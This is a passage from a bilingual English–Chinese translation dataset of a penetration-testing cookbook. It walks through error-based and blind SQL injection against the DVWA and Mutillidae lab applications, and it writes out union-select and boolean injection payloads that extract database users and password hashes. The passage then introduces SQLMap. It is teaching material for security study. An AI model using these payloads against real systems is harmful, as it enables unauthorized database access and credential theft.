- en: In the previous recipe, we detected an SQLi. In this recipe, we will exploit
    that vulnerability and use it to extract information from the database.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 在之前的示例中，我们检测到一个SQL注入漏洞。在本示例中，我们将利用该漏洞并用它提取数据库中的信息。
- en: How to do it...
  id: totrans-105
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何进行……
- en: 'We already know that DVWA is vulnerable to SQLi, so let''s log in and browse
    to `http://192.168.56.11/dvwa/vulnerabilities/sqli/`. Then, follow the following
    steps:'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经知道DVWA存在SQL注入漏洞，所以让我们登录并浏览到`http://192.168.56.11/dvwa/vulnerabilities/sqli/`。然后，按照以下步骤进行操作：
- en: After detecting that an SQLi exists, the next step is to get to know the internal
    query, or, more precisely, the number of columns its result has. Enter any number
    in the User ID box and click Submit.
  id: totrans-107
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在检测到SQL注入存在后，下一步是了解内部查询，或者更准确地说，是查询结果的列数。在用户ID框中输入任意数字并点击提交。
- en: Now, open the HackBar (hit *F9*) and click Load URL. The URL in the address
    bar should now appear in the HackBar.
  id: totrans-108
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，打开HackBar（按*F9*）并点击加载URL。地址栏中的URL应该现在出现在HackBar中。
- en: 'In the HackBar, we replace the value of the id parameter with `1'' order by
    1 -- ''` and click Execute, as shown in the following screenshot:'
  id: totrans-109
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在HackBar中，我们将id参数的值替换为`1' order by 1 -- '`并点击执行，如下截图所示：
- en: '![](assets/97f388d1-0802-477a-b9de-f33456618bbc.png)'
  id: totrans-110
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/97f388d1-0802-477a-b9de-f33456618bbc.png)'
- en: 'We keep increasing the number after `order by` and executing the requests until
    we get an error. In this example, it happens when ordering by column `3`. This
    means that the result of the query has only two columns and an error is triggered
    when we attempt to order it by a non-existent column:'
  id: totrans-111
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们不断增加`order by`后面的数字并执行请求，直到出现错误。在这个例子中，错误发生在按第`3`列排序时。这意味着查询结果只有两列，当我们尝试按一个不存在的列进行排序时，会触发错误：
- en: '![](assets/863fd488-27a9-4d92-9059-57260e3421c6.png)'
  id: totrans-112
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/863fd488-27a9-4d92-9059-57260e3421c6.png)'
- en: 'Now we know the query has two columns. Let''s try to use the `union` statement
    to extract some information. Set the value of `id` to `1'' union select 1,2 --
    ''` and Execute. You should have two results:'
  id: totrans-113
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们知道查询有两列。让我们尝试使用`union`语句提取一些信息。将`id`的值设置为`1' union select 1,2 -- '` 然后执行。你应该会看到两个结果：
- en: '![](assets/f904a417-4966-4aab-a834-b41595739ec8.png)'
  id: totrans-114
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/f904a417-4966-4aab-a834-b41595739ec8.png)'
- en: 'This means we can ask for two values in that union query. Let''s get the version
    of the DBMS and the database user. Set `id` to `1'' union select @@version,current_user()
    -- ''` and Execute:'
  id: totrans-115
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这意味着我们可以在这个联合查询中请求两个值。让我们获取DBMS的版本和数据库用户。将`id`设置为`1' union select @@version,current_user()
    -- '` 然后执行：
- en: '![](assets/a511ea7a-b70e-4cc1-93bd-1d50c8a22ac8.png)'
  id: totrans-116
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/a511ea7a-b70e-4cc1-93bd-1d50c8a22ac8.png)'
- en: 'Let''s look for something more relevant, the users of the application, for
    example. First, we need to locate the users'' table. Set the `id` to `1'' union
    select table_schema, table_name FROM information_schema.tables WHERE table_name
    LIKE ''%user%'' -- ''` and submit to get the following result:'
  id: totrans-117
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们寻找一些更相关的信息，比如应用程序的用户。首先，我们需要定位用户的表。将`id`设置为`1' union select table_schema,
    table_name FROM information_schema.tables WHERE table_name LIKE '%user%' -- '`
    并提交，得到以下结果：
- en: '![](assets/508635f9-ff6b-4e05-ae39-453e45155d00.png)'
  id: totrans-118
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/508635f9-ff6b-4e05-ae39-453e45155d00.png)'
- en: OK, we know that the database (or schema) is called `dvwa` and the table we
    are looking for is `users`. As we have only two positions to set values, we need
    to know which columns of the table are useful to us; set `id` to `1' union select
    column_name, 1 FROM information_schema.tables WHERE table_name = 'users' -- '`.
  id: totrans-119
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 好的，我们知道数据库（或模式）叫做`dvwa`，我们正在寻找的表是`users`。由于我们只有两个位置来设置值，我们需要知道表的哪些列对我们有用；将`id`设置为`1'
    union select column_name, 1 FROM information_schema.tables WHERE table_name =
    'users' -- '`。
- en: 'And finally, we know exactly what to ask for. Set id to `1'' union select user,
    password FROM dvwa.users -- ''`:'
  id: totrans-120
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，我们知道该查询具体要请求什么。将`id`设置为`1' union select user, password FROM dvwa.users --
    '`：
- en: '![](assets/55080009-b796-4844-acf7-72c5798ef9b9.png)'
  id: totrans-121
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/55080009-b796-4844-acf7-72c5798ef9b9.png)'
- en: In the `First name:` field we have the application's username, and, in the `Surname:` field,
    we have each user's password hash. We can copy those hashes to a text file and
    try to crack them with John the Ripper, or our favorite password cracker.
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 在`First name:`字段中，我们有应用程序的用户名，而在`Surname:`字段中，我们有每个用户的密码哈希。我们可以将这些哈希复制到文本文件中，然后使用John
    the Ripper或我们喜欢的密码破解工具来尝试破解它们。
- en: How it works...
  id: totrans-123
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何运作...
- en: From our first injection, `1' order by 1 -- '` through `1' order by 3 -- '`,
    we are using a feature in SQL that allows us to order the results of a query by
    a certain field or column using its number in the order it is declared in the
    query. We used this to generate an error so that we could find out how many columns
    the query has, and so that we can use them to create a `union` query.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 从我们的第一次注入，`1' order by 1 -- '`到`1' order by 3 -- '`，我们使用了SQL中的一个功能，允许我们根据查询中声明的字段顺序号来对查询结果进行排序。我们使用这个功能生成了一个错误，以便找出查询中有多少列，从而可以利用这些列创建一个`union`查询。
- en: 'The `union` statement is used to concatenate two queries that have the same
    number of columns. By injecting this, we are able to query almost anything to
    the database. In this recipe, we first checked whether it was working as expected.
    After that, we set our objective in the users'' table and did the following to
    get it:'
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: '`union`语句用于连接两个查询，这两个查询的列数相同。通过注入这个，我们几乎可以查询数据库中的任何内容。在本示例中，我们首先检查了它是否按预期工作。之后，我们把目标设置在了`users`表，并执行了以下操作来获取数据：'
- en: The first step was to discover the database and table's names. We did this by
    querying the `information_schema` database, which is the one that stores all information
    on databases, tables, and columns in MySQL.
  id: totrans-126
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 第一步是发现数据库和表的名称。我们通过查询`information_schema`数据库完成了这个任务，`information_schema`是存储所有数据库、表和列信息的数据库。
- en: Once we knew the names of the database and table, we queried for the columns
    in the table to find out which ones we were looking for, which turned out to be
    user and password.
  id: totrans-127
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦我们知道了数据库和表的名称，我们查询了表中的列，找出我们需要的列，结果是用户名和密码。
- en: And lastly, we injected a query asking for all usernames and passwords in the
    users table of the `dvwa` database.
  id: totrans-128
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，我们注入了一个查询，要求返回`dvwa`数据库中`users`表的所有用户名和密码。
- en: Identifying and exploiting blind SQL injections
  id: totrans-129
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 识别和利用盲SQL注入
- en: We already saw how an SQLi vulnerability works. In this recipe, we will cover
    a different vulnerability of the same kind, one that does not show an error message
    or a hint that could lead us to the exploitation. We will learn how to identify
    and exploit a blind SQLi.
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经看到SQL注入漏洞是如何工作的。在本示例中，我们将介绍同类型的另一种漏洞，它不会显示错误信息或任何可能引导我们进行利用的提示。我们将学习如何识别和利用盲SQL注入。
- en: How to do it...
  id: totrans-131
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何做到...
- en: 'Log into DVWA and go to SQL Injection (Blind):'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 登录到DVWA并进入SQL注入（盲注）：
- en: The form looks exactly the same as the SQLi form we saw in the previous recipes.
    Type `1` in the textbox and click Submit to see the information about the user
    with the ID `1`.
  id: totrans-133
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这个表单看起来和我们在前面的示例中看到的SQL注入表单完全一样。在文本框中输入`1`并点击提交，以查看ID为`1`的用户信息。
- en: 'Now, let''s perform our first test with `1''` and see whether we get an error
    as in previous recipes:'
  id: totrans-134
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，让我们用`1'`进行第一次测试，看看是否像前面的示例一样出现错误：
- en: '![](assets/dc57be9c-d1b4-4004-a45f-7374db0143ce.png)'
  id: totrans-135
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/dc57be9c-d1b4-4004-a45f-7374db0143ce.png)'
- en: We get no error message, but no result either. Something interesting could be
    happening here.
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 我们没有收到错误信息，但也没有结果。这里可能发生了一些有趣的事情。
- en: 'We perform our second test with `1''''`:'
  id: totrans-137
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们用`1''`进行第二次测试：
- en: '![](assets/bab46b64-edc8-4eb3-a2a8-5e6379ab2481.png)'
  id: totrans-138
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/bab46b64-edc8-4eb3-a2a8-5e6379ab2481.png)'
- en: The result for ID `1` is shown. This means that the previous test (`1'`) was
    an error that was captured and processed by the application. It's highly probable
    that we have an SQLi here, but it seems to be blind—no information about the database
    is shown, so we will need to guess.
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: ID为`1`的结果如下所示。这意味着之前的测试（`1'`）是一个错误，已被应用程序捕获并处理。我们很可能在这里有SQLi漏洞，但似乎是盲SQLi—没有显示数据库信息，因此我们需要猜测。
- en: Let's try to identify what happens when you inject some code that is always
    false. Set `1*'*` and `'1'='2` as the user ID. `1` is not equal to `2`, so no
    record meets the selection criteria in the query and no result is given.
  id: totrans-140
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们尝试识别当你注入一些总是返回假值的代码时会发生什么。将`1*'*`和`'1'='2`作为用户ID。`1`不等于`2`，因此查询中没有记录符合选择条件，结果为空。
- en: 'Now try a query that will always be true when the ID exists: `1'' and ''1''=''1`:'
  id: totrans-141
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在尝试一个在ID存在时始终为真的查询：`1' and '1'='1`：
- en: '![](assets/f6eb8319-c122-472c-b790-b986888ef2cb.png)'
  id: totrans-142
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/f6eb8319-c122-472c-b790-b986888ef2cb.png)'
- en: 'This demonstrates that there is a blind SQLi in this page: if we get different
    responses to an injection of SQL code that always gives a false result, and another
    one that always gives a true result, we have a vulnerability because the server
    is executing the code, even if it doesn''t show it explicitly in the response.'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 这表明此页面存在盲SQL注入（SQLi）漏洞：如果我们注入的SQL代码总是返回假结果，而另一段注入代码总是返回真结果，那么我们就有了漏洞，因为服务器正在执行这些代码，即使它在响应中没有明确显示出来。
- en: In this recipe, we will discover the name of the user connecting to the database,
    so we first need to know the length of the username. Let's try one. Inject this:` 1'
    and 1=char_length(current_user()) and '1'='1`.
  id: totrans-144
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在这个方案中，我们将发现连接到数据库的用户名，因此我们首先需要知道用户名的长度。我们先尝试一个。注入这个：`1' and 1=char_length(current_user())
    and '1'='1`。
- en: 'The next step is to find this last request in Burp Suite''s proxy history and
    send it to the intruder, as shown in the following screenshot:'
  id: totrans-145
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是找到Burp Suite代理历史中的最后一个请求，并将其发送到Intruder，如下图所示：
- en: '![](assets/d5f5ecf3-1b65-4598-941b-81e0b5432c94.png)'
  id: totrans-146
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/d5f5ecf3-1b65-4598-941b-81e0b5432c94.png)'
- en: 'Once sent to the intruder, we can clear all the payload markers and add one
    in the `1` after the first `and`, as shown in the following screenshot:'
  id: totrans-147
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦发送到Intruder，我们可以清除所有有效负载标记，并在第一个`and`后面的`1`处添加一个，如下图所示：
- en: '![](assets/3935dc15-2d47-437f-9375-621a3717fff4.png)'
  id: totrans-148
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/3935dc15-2d47-437f-9375-621a3717fff4.png)'
- en: Go to the Payload section and set the Payload type to Numbers.
  id: totrans-149
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 进入有效负载部分，将有效负载类型设置为数字。
- en: 'Set the Payload type to Sequential, from `1` to `15` with a step of one. It
    should look like this:'
  id: totrans-150
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将有效负载类型设置为顺序，从`1`到`15`，步长为1。它应该是这样的：
- en: '![](assets/6139f9de-72c4-4ee3-a6ef-b8b5fab6bad9.png)'
  id: totrans-151
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/6139f9de-72c4-4ee3-a6ef-b8b5fab6bad9.png)'
- en: 'To see whether a response is positive or negative, go to Intruder''s options,
    clear the Grep - Match list, and add `First name`:'
  id: totrans-152
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了查看响应是正面还是负面，进入Intruder的选项，清空Grep - Match列表，然后添加`First name`：
- en: '![](assets/b96f5d74-92c6-4e16-a6d9-7049435ac93c.png)'
  id: totrans-153
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b96f5d74-92c6-4e16-a6d9-7049435ac93c.png)'
- en: We need to make this change in every Intruder tab we use for this attack.
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要在每个用于此攻击的Intruder标签中进行此更改。
- en: 'Start the attack. The result shows that the user name is six characters long:'
  id: totrans-155
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 开始攻击。结果显示用户名是六个字符长：
- en: '![](assets/6ee39402-b5ea-4915-afb5-4226ca2c18ae.png)'
  id: totrans-156
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/6ee39402-b5ea-4915-afb5-4226ca2c18ae.png)'
- en: 'Now, we are going to guess each character in the username, starting by guessing
    the first letter. Submit the following in the application: `1'' and current_user
    LIKE ''a%`. The `%` character is a wildcard in SQL that will match any string.
    We chose `a` as the first letter to get Burp Suite to obtain the request. It could
    have been any letter.'
  id: totrans-157
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们将从猜测第一个字母开始，逐个猜测用户名的每个字符。请在应用程序中提交以下内容：`1' and current_user LIKE 'a%`。`%`字符是SQL中的通配符，能够匹配任何字符串。我们选择`a`作为第一个字母，以便Burp
    Suite能够获取请求。它也可以是任何字母。
- en: 'Again, we send the request to the Intruder and leave only one payload marker
    in the `a`, which is the first letter of the name:'
  id: totrans-158
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 同样，我们将请求发送到Intruder，并在`a`处仅保留一个有效负载标记，这是用户名的第一个字母：
- en: '![](assets/596fb89b-b65a-4f88-ac2e-110416504b93.png)'
  id: totrans-159
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/596fb89b-b65a-4f88-ac2e-110416504b93.png)'
- en: 'Our payloads will be a simple list containing all the lowercase letters (a
    to z), numbers (0 to 9), and some special characters (-, +, #, %, @). Uppercase
    letters are omitted because select queries in MySQL are not case sensitive.'
  id: totrans-160
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '我们的有效负载将是一个简单的列表，包含所有小写字母（a到z）、数字（0到9）和一些特殊字符（-, +, #, %, @）。大写字母被省略，因为MySQL中的select查询对大小写不敏感。'
- en: 'Repeat *step 12* in this Intruder tab and start the attack, as shown here:'
  id: totrans-161
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在这个Intruder标签中重复*步骤12*并开始攻击，如下所示：
- en: '![](assets/bc8240ed-3aa8-42c5-b7fb-60b73912164c.png)'
  id: totrans-162
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/bc8240ed-3aa8-42c5-b7fb-60b73912164c.png)'
- en: The first letter of our user name is `d`.
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 我们用户名的第一个字母是`d`。
- en: Now, we need to find the second character of the name, so we submit `1' and
    current_user LIKE 'da%` to the application's textbox and send the request to the
    intruder.
  id: totrans-164
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们需要找到用户名的第二个字符，于是我们提交`1' and current_user LIKE 'da%`到应用程序的文本框，并将请求发送给入侵者。
- en: Now, our payload marker will be the `a` following the `d`; in other words, the
    second letter of the name.
  id: totrans-165
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们的有效负载标记将是紧随`d`后的`a`；换句话说，就是用户名的第二个字母。
- en: 'Start the attack to discover the second letter. You will see that it''s `v`:'
  id: totrans-166
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 开始攻击以发现第二个字母。你将看到它是`v`：
- en: '![](assets/3f1a6566-086c-4180-b8f5-4214197086f5.png)'
  id: totrans-167
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/3f1a6566-086c-4180-b8f5-4214197086f5.png)'
- en: 'Keep discovering all six characters in the username. You may notice that the
    `%` symbol in the payload is always marked as true. This is because, as we said
    previously, this symbol is a wildcard. We need it because it is a valid character
    in usernames. As we can see in the following screenshot, the last character is
    indeed `%`:'
  id: totrans-168
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 继续发现用户名中的所有六个字符。你可能会注意到，负载中的`%`符号总是被标记为正确。这是因为，正如我们之前所说，这个符号是一个通配符。我们需要它，因为它是用户名中的一个有效字符。正如我们在下面的截图中看到的，最后一个字符确实是`%`：
- en: '![](assets/0d0ae8c8-102c-4daf-8e1b-fa33c70f17fb.png)'
  id: totrans-169
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/0d0ae8c8-102c-4daf-8e1b-fa33c70f17fb.png)'
- en: According to this result, the user name is `dvwa@%`. The second `%` character
    is part of our injection and matches the empty string after the actual name.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 根据这个结果，用户名是`dvwa@%`。第二个`%`字符是我们注入的一部分，并且匹配实际用户名后面的空字符串。
- en: 'To verify the discovered username, we replace the like operator with `=`. Submit `1''
    and current_user()=''dvwa@%` to the page:'
  id: totrans-171
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了验证发现的用户名，我们将like操作符替换为`=`。提交`1' and current_user()='dvwa@%`到页面：
- en: '![](assets/5be57c5d-d423-4aa5-8849-96f4a3ac0a27.png)'
  id: totrans-172
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/5be57c5d-d423-4aa5-8849-96f4a3ac0a27.png)'
- en: This confirms that we have found the correct name for the current user.
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 这确认我们已经找到了当前用户的正确用户名。
- en: How it works...
  id: totrans-174
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: 'Error-based SQLi and blind SQLi are, on the server side, the same vulnerability:
    the application doesn''t sanitize inputs before using them to generate a query
    to the database. The difference between them lies in detection and exploitation.'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 基于错误的SQL注入和盲SQL注入在服务器端是同一个漏洞：应用程序在使用输入生成查询到数据库时，没有对输入进行消毒。它们之间的区别在于检测和利用方式。
- en: In an error-based SQLi, we use the errors sent by the server to identify the
    type of query, tables, and column names.
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 在基于错误的SQL注入中，我们利用服务器发送的错误信息来识别查询类型、表名和列名。
- en: 'On the other hand, when we try to exploit a blind injection, we need to harvest
    the information by asking questions such as *is there a user whose name starts
    with "a"*?, and then *is there a user whose name starts with "aa"*?*, *or as an
    SQLi: `''and name like ''a%`, so it may take more time to detect and exploit.'
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 另一方面，当我们尝试利用盲注时，我们需要通过提问来获取信息，比如*是否有一个用户名以"a"开头*？然后是*是否有一个用户名以"aa"开头*？，*或者作为一个SQLi：`'and
    name like 'a%`，因此可能需要更多的时间来检测和利用。
- en: Manually exploiting blind SQLi takes much more effort and time than error-based
    injection; in this recipe, we saw how to obtain the name of the user connected
    to the database, but in the previous recipe, we used a single command to get it.
    We could have used a dictionary approach to see whether the current user was in
    a list of names, but it would take much more time, and the name might not be in
    the list anyway.
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 手动利用盲SQL注入比基于错误的注入需要更多的努力和时间；在这个例子中，我们看到如何获取连接到数据库的用户的用户名，但在前一个例子中，我们使用一个命令就能得到它。我们本可以使用字典法来检查当前用户是否在用户名列表中，但这样会花费更多时间，而且用户名可能根本不在列表里。
- en: Once we knew there was an injection and what a positive response would look
    like, we proceeded to ask for the length of the current username. We asked the
    database *is 1 the length of the current username*?, *is it 2*, and so on, until
    discovering the length. It is useful to know when to stop looking for characters
    in the username.
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们知道有注入并且知道一个正面响应的样子，我们就开始询问当前用户名的长度。我们询问数据库*当前用户名的长度是1吗*？*是2吗*？依此类推，直到发现长度。知道何时停止查找用户名中的字符非常有用。
- en: After finding the length, we use the same technique to discover the first letter.
    The `LIKE 'a%'` statement tells the SQL interpreter whether or not the first letter
    is `a`; the rest doesn't matter, it could be anything (`%` is the wildcard character
    for most SQL implementations). Here, we saw that the first letter was `d`. Using
    the same principle, we found the rest of the characters and worked out the name.
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 在找出长度后，我们使用相同的技巧来发现第一个字母。`LIKE 'a%'`语句告诉SQL解释器第一个字母是否为`a`；其余部分无关紧要，可以是任何内容（`%`是大多数SQL实现中的通配符字符）。在这里，我们发现第一个字母是`d`。使用相同的原理，我们找出了其余的字符并推算出名称。
- en: There's more...
  id: totrans-181
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 还有更多…
- en: This attack could continue by finding out the DBMS, the version being used,
    and then using vendor-specific commands to see whether the user has administrative
    privileges. If they do, you would extract all usernames and passwords, activate
    remote connections, and many more things besides. One other thing you could try
    is to use tools to automate this type of attack, such as SQLMap, which we will
    cover in the next recipe.
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 这种攻击可以通过找出数据库管理系统（DBMS）、所使用的版本，然后使用特定厂商的命令查看用户是否具有管理员权限。如果是，你可以提取所有的用户名和密码，激活远程连接，除此之外，还能做许多其他操作。你还可以尝试使用工具来自动化这种攻击，例如SQLMap，我们将在下一个教程中介绍。
- en: See also
  id: totrans-183
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 另见
- en: There is another kind of blind injection, which is called **time-based Blind
    SQLi**, in which we don't have a visual clue whether or not the command was executed
    (as in valid or invalid account messages). Instead, we need to send a sleep command
    to the database and, if the response time is slightly longer than the one we sent,
    then it is a true response. This kind of attack is slow as it is sometimes necessary
    to wait even 30 seconds to get just one character. It is very useful to have tools
    such as sqlninja or SQLMap in these situations ([https://www.owasp.org/index.php/Blind_SQL_Injection](https://www.owasp.org/index.php/Blind_SQL_Injection)).
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 还有另一种盲注类型，称为**基于时间的盲SQLi**，在这种情况下，我们无法通过视觉提示知道命令是否执行（例如有效或无效账户消息）。相反，我们需要向数据库发送一个睡眠命令，如果响应时间比我们发送的时间稍长，那么它就是一个真实的响应。这种攻击过程较慢，因为有时甚至需要等待30秒才能得到一个字符。在这种情况下，使用sqlninja或SQLMap等工具非常有用（[https://www.owasp.org/index.php/Blind_SQL_Injection](https://www.owasp.org/index.php/Blind_SQL_Injection)）。
- en: 'Have a look at the following links for more information on Blind SQLi:'
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 查看以下链接以获取有关盲SQLi的更多信息：
- en: '[https://www.owasp.org/index.php/Blind_SQL_Injection](https://www.owasp.org/index.php/Blind_SQL_Injection)'
  id: totrans-186
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://www.owasp.org/index.php/Blind_SQL_Injection](https://www.owasp.org/index.php/Blind_SQL_Injection)'
- en: '[https://www.exploit-db.com/papers/13696/](https://www.exploit-db.com/papers/13696/)'
  id: totrans-187
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://www.exploit-db.com/papers/13696/](https://www.exploit-db.com/papers/13696/)'
- en: '[https://www.sans.org/reading-room/whitepapers/securecode/sql-injection-modes-attack-defence-matters-23](https://www.sans.org/reading-room/whitepapers/securecode/sql-injection-modes-attack-defence-matters-23)'
  id: totrans-188
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://www.sans.org/reading-room/whitepapers/securecode/sql-injection-modes-attack-defence-matters-23](https://www.sans.org/reading-room/whitepapers/securecode/sql-injection-modes-attack-defence-matters-23)'
- en: Finding and exploiting SQL injections with SQLMap
  id: totrans-189
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用SQLMap寻找并利用SQL注入
- en: As seen in the previous recipe, exploiting SQLi can be an industrious process.
    SQLMap is a command-line tool included in Kali Linux that can help us with the
    automation of detecting and exploiting SQL injections with multiple techniques
    and in a wide variety of databases.
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 如前一个教程所示，利用SQLi可能是一个繁琐的过程。SQLMap是Kali Linux中包含的一个命令行工具，可以帮助我们自动化检测并利用SQL注入，支持多种技术并适用于各种数据库。
- en: In this recipe, we will use SQLMap to detect and exploit an SQLi vulnerability
    and to obtain usernames and passwords of an application.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个教程中，我们将使用SQLMap检测并利用SQL注入（SQLi）漏洞，以获取应用程序的用户名和密码。
- en: How to do it...
  id: totrans-192
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作…
- en: 'Browse to `http://192.168.56.11/mutillidae` and go to OWASP Top 10 | A1 – SQL
    Injection | SQLi Extract Data | User Info:'
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 浏览到`http://192.168.56.11/mutillidae`并访问OWASP Top 10 | A1 – SQL注入 | SQLi提取数据
    | 用户信息：
- en: Try any username and password, for example, `user` and `password`, and click
    View Account Details.
  id: totrans-194
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 尝试任何用户名和密码，例如`user`和`password`，然后点击查看账户详情。
- en: The login will fail, but we are interested in the URL. Go to the address bar
    and copy the full URL to the clipboard. It should be something like `http://192.168.56.11/mutillidae/index.php?page=user-info.php&username=user&password=password&user-info-php-submit-button=View+Account+Details`.
  id: totrans-195
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 登录会失败，但我们关注的是网址。前往地址栏并将完整网址复制到剪贴板。网址应类似于`http://192.168.56.11/mutillidae/index.php?page=user-info.php&username=user&password=password&user-info-php-submit-button=View+Account+Details`。
- en: 'Now, in a Terminal window, type the following command:'
  id: totrans-196
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，在终端窗口中输入以下命令：
- en: '[PRE9]'
  id: totrans-197
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: 'You can see that the `-u` parameter has the copied URL as its value. With `-p`,
    we are telling SQLMap that we want to look for SQLi in the username parameter
    and, once the vulnerability is exploited, that we want it to retrieve the current
    database username and the database''s name, and know whether that user has administrative
    permissions within the database. The retrieval of this information is because
    we only want to be able to tell whether there is an SQLi in that URL in the `username`
    parameter. The following screenshot shows the command and how SQLMap indicates
    execution:'
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以看到`-u`参数的值是复制的 URL。通过`-p`，我们告诉 SQLMap 我们想在用户名参数中查找 SQLi，并且在漏洞被利用后，我们希望它能检索当前数据库用户名和数据库名称，并了解该用户是否具有数据库中的管理员权限。检索这些信息是因为我们只想知道是否在该
    URL 的`username`参数中存在 SQLi。以下截图展示了命令以及 SQLMap 执行的指示：
- en: '![](assets/c5c23c54-10d7-40fb-ac2c-6bfa0899d3c0.png)'
  id: totrans-199
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/c5c23c54-10d7-40fb-ac2c-6bfa0899d3c0.png)'
- en: Once SQLMap detects the DBMS used by the application, it will also ask whether
    we want to skip the test for other DBMS and whether we want to include all tests
    for the specific system detected, even if they are beyond the scope of the current
    level and risk configured. In this case, we answer `Yes` to skip other systems
    and `No` to include all tests.
  id: totrans-200
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
